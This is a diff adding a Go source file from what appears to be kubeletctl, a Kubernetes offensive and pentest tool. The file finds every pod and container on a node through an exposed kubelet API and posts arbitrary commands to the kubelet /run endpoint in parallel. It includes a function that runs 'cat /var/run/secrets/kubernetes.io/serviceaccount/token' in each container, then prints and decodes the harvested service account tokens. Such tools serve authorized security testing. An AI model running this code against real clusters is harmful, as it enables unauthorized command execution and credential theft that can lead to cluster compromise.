@@ -1,0 +1,252 @@
+package utils
+
+
+// TODO: consider move this file to be under api package.
+// It will cause import cycling because of some of the constants use. Maybe it will be better to move the
+// constant.go to to the pgk folder.
+
+import (
+	"fmt"
+	"io/ioutil"
+	"kubeletctl/pkg/api"
+	"net/http"
+	"os"
+	"strings"
+)
+
+
+func GetPodsForRunCommand(nodeIPAddress string) []RunPodInfo {
+	pods, err := GetPodListFromNodeIP(nodeIPAddress)
+	if err != nil {
+		fmt.Println("[*] Failed to get pods from Node and run command, exiting")
+		os.Exit(1)
+	}
+
+	var urls []RunPodInfo
+	for _, pod := range pods.Items {
+		for _, container := range pod.Spec.Containers {
+			apiPathUrl := fmt.Sprintf("https://%s:%s%s/%s/%s/%s", nodeIPAddress, KUBELET_DEFAULT_PORT, api.RUN, pod.Namespace, pod.Name, container.Name)
+
+			urls = append(urls, RunPodInfo{
+				Url:           apiPathUrl,
+				PodName:       pod.Name,
+				ContainerName: container.Name,
+				Namespace:     pod.Namespace,
+			})
+		}
+	}
+
+	return urls
+}
+
+
+func RunCommandOnAllPodsInANode(nodeIPAddress string, command string){
+	urls := GetPodsForRunCommand(nodeIPAddress)
+	runParallelCommandsOnPods(urls, CONCURRENCY_DEFAULT_LIMIT, command)
+}
+
+type RunPodInfo struct {
+	Url string
+	PodName string
+	ContainerName string
+	Namespace string
+}
+
+type RunOutput struct {
+	StatusCode int
+	PodInfo        RunPodInfo
+	Err        error
+	Output     string
+}
+
+
+
+func runParallelCommandsOnPods(runPodsInfo []RunPodInfo, concurrencyLimit int, command string) []string {
+	// make a slice to hold the results we're expecting
+	var vulnerableNodes []string
+
+	// this buffered channel will block at the concurrency limit
+	semaphoreChan := make(chan struct{}, concurrencyLimit)
+
+
+	// this channel will not block and collect the http request results
+	resultsChan := make(chan *RunOutput)
+
+	// make sure we close these channels when we're done with them
+	defer func() {
+		close(semaphoreChan)
+		close(resultsChan)
+	}()
+
+	// keen an index and loop through every Url we will send a request to
+	for i, podInfo := range runPodsInfo {
+
+		// start a go routine with the index and Url in a closure
+		go func(i int, podInfo RunPodInfo) {
+
+			// this sends an empty struct into the semaphoreChan which
+			// is basically saying add one to the limit, but when the
+			// limit has been reached block until there is room
+			semaphoreChan <- struct{}{}
+
+			statusCode := 0
+			output := ""
+
+			resp, err := api.PostRequest(api.GlobalClient, podInfo.Url, []byte(command))
+
+			if err == nil && resp != nil {
+				statusCode = resp.StatusCode
+
+				bodyBytes, err := ioutil.ReadAll(resp.Body)
+				if err == nil {
+					output = string(bodyBytes)
+				}
+
+			}
+
+			result := &RunOutput{statusCode, podInfo, err, output}
+
+
+			// now we can send the Result struct through the resultsChan
+			resultsChan <- result
+			// once we're done it's we read from the semaphoreChan which
+			// has the effect of removing one from the limit and allowing
+			// another goroutine to start
+			<-semaphoreChan
+
+		}(i, podInfo)
+	}
+
+
+	// start listening for any results over the resultsChan
+	// once we get a Result append it to the Result slice
+	var count int
+	numberOfSpaces := "   "
+	for {
+		result := <-resultsChan
+
+		count += 1
+		if count > 9 {
+			numberOfSpaces = "    "
+		}
+		if result.StatusCode == http.StatusOK {
+			var sb strings.Builder
+			sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", count, result.PodInfo.PodName))
+			sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", numberOfSpaces, result.PodInfo.Namespace))
+			sb.WriteString(fmt.Sprintf("%sContainer: %s\n", numberOfSpaces, result.PodInfo.ContainerName))
+			sb.WriteString(fmt.Sprintf("%sUrl: %s\n", numberOfSpaces, result.PodInfo.Url))
+			sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", numberOfSpaces, result.Output))
+			fmt.Println(sb.String())
+		}
+
+		// if we've reached the expected amount of runPodsInfo then stop
+		if count == len(runPodsInfo) {
+			break
+		}
+	}
+
+	// now we're done we return the results
+	return vulnerableNodes
+}
+
+
+
+
+
+
+func GetTokensFromAllPods(nodeIPAddress string){
+	urls := GetPodsForRunCommand(nodeIPAddress)
+	getAndPrintTokens(urls, CONCURRENCY_DEFAULT_LIMIT)
+}
+
+// TODO: this function should refactor, it similar to the run command parallel with the only change of getting token.
+// Check if possible to move the result channel out to a new function.
+func getAndPrintTokens(runPodsInfo []RunPodInfo, concurrencyLimit int) {
+	command := "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+
+	// this buffered channel will block at the concurrency limit
+	semaphoreChan := make(chan struct{}, concurrencyLimit)
+
+	// this channel will not block and collect the http request results
+	resultsChan := make(chan *RunOutput)
+
+	// make sure we close these channels when we're done with them
+	defer func() {
+		close(semaphoreChan)
+		close(resultsChan)
+	}()
+
+	// keen an index and loop through every Url we will send a request to
+	for i, podInfo := range runPodsInfo {
+
+		// start a go routine with the index and Url in a closure
+		go func(i int, podInfo RunPodInfo) {
+
+			// this sends an empty struct into the semaphoreChan which
+			// is basically saying add one to the limit, but when the
+			// limit has been reached block until there is room
+			semaphoreChan <- struct{}{}
+
+			statusCode := 0
+			output := ""
+
+			resp, err := api.PostRequest(api.GlobalClient, podInfo.Url, []byte(command))
+
+			if err == nil && resp != nil {
+				statusCode = resp.StatusCode
+
+				bodyBytes, err := ioutil.ReadAll(resp.Body)
+				if err == nil {
+					output = string(bodyBytes)
+				}
+
+			}
+
+			result := &RunOutput{statusCode, podInfo, err, output}
+
+
+			// now we can send the Result struct through the resultsChan
+			resultsChan <- result
+			// once we're done it's we read from the semaphoreChan which
+			// has the effect of removing one from the limit and allowing
+			// another goroutine to start
+			<-semaphoreChan
+
+		}(i, podInfo)
+	}
+
+
+	// start listening for any results over the resultsChan
+	// once we get a Result append it to the Result slice
+	var count int
+	numberOfSpaces := "   "
+	for {
+		result := <-resultsChan
+
+		count += 1
+
+		// If we have more than 1 digit, we need to add more spaces to straight the lines
+		// And what if we will have more than 2 digits?
+		// You mean, a node with more than 99 pods and containers together? nah.. :)
+		if count > 9 {
+			numberOfSpaces = "    "
+		}
+
+		if result.StatusCode == http.StatusOK {
+			var sb strings.Builder
+			sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", count, result.PodInfo.PodName))
+			sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", numberOfSpaces, result.PodInfo.Namespace))
+			sb.WriteString(fmt.Sprintf("%sContainer: %s\n", numberOfSpaces, result.PodInfo.ContainerName))
+			sb.WriteString(fmt.Sprintf("%sUrl: %s\n", numberOfSpaces, result.PodInfo.Url))
+			sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", numberOfSpaces, result.Output))
+			fmt.Println(sb.String())
+			PrintDecodedToken(result.Output)
+		}
+
+		// if we've reached the expected amount of runPodsInfo then stop
+		if count == len(runPodsInfo) {
+			break
+		}
+	}
+
+}
